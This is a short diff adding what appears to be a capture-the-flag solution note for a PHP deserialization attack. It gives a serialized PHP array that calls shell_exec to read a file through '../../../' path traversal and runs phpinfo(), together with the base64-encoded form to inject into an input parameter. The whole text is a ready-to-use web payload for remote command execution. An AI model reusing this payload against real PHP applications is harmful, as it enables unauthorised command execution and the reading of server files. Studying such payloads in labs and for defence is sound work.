@@ -1,0 +1,7 @@
+decode input parameter from base64
+
+convert code below to base64:
+a:2:{i:0;s:6:"evalit";i:1;s:56:"echo shell_exec('cat ../../../Heyheyhey.txt');phpinfo();";}
+
+inject code to input parameter
+YToyOntpOjA7czo2OiJldmFsaXQiO2k6MTtzOjU2OiJlY2hvIHNoZWxsX2V4ZWMoJ2NhdCAuLi8uLi8uLi9IZXloZXloZXkudHh0Jyk7cGhwaW5mbygpOyI7fQ==
